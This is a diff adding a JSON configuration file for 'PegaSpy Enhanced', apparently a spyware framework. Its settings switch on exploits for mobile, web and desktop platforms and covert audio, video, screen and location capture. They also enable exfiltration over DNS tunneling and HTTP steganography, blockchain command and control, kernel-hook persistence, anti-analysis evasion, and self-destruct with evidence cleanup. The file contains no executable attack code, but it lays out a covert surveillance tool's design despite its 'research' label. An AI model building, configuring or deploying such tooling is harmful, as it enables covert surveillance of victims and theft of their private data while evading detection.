@@ -1,0 +1,65 @@
+{
+  "framework": {
+    "name": "PegaSpy Enhanced",
+    "version": "2.0.0",
+    "mode": "research"
+  },
+  "exploits": {
+    "enabled": true,
+    "auto_update": false,
+    "stealth_mode": true,
+    "target_platforms": [
+      "ios",
+      "android",
+      "web",
+      "desktop"
+    ]
+  },
+  "surveillance": {
+    "audio_enabled": true,
+    "video_enabled": true,
+    "screen_capture_enabled": true,
+    "location_tracking_enabled": true,
+    "max_concurrent_sessions": 10
+  },
+  "data_exfiltration": {
+    "encryption_enabled": true,
+    "compression_enabled": true,
+    "stealth_delays": true,
+    "max_chunk_size": 1024,
+    "channels": {
+      "dns_tunneling": true,
+      "http_steganography": true,
+      "sms_covert": false,
+      "bluetooth_beacon": false
+    }
+  },
+  "c2": {
+    "blockchain_enabled": true,
+    "encryption": "AES-256",
+    "heartbeat_interval": 300,
+    "backup_channels": 3
+  },
+  "persistence": {
+    "kernel_hooks_enabled": true,
+    "auto_restart": true,
+    "stealth_techniques": true
+  },
+  "evasion": {
+    "anti_debugging": true,
+    "sandbox_detection": true,
+    "vm_detection": true,
+    "behavioral_analysis": true
+  },
+  "logging": {
+    "level": "INFO",
+    "file_logging": true,
+    "max_log_size": "100MB",
+    "log_retention_days": 30
+  },
+  "security": {
+    "self_destruct_enabled": true,
+    "evidence_cleanup": true,
+    "secure_delete": true
+  }
+}
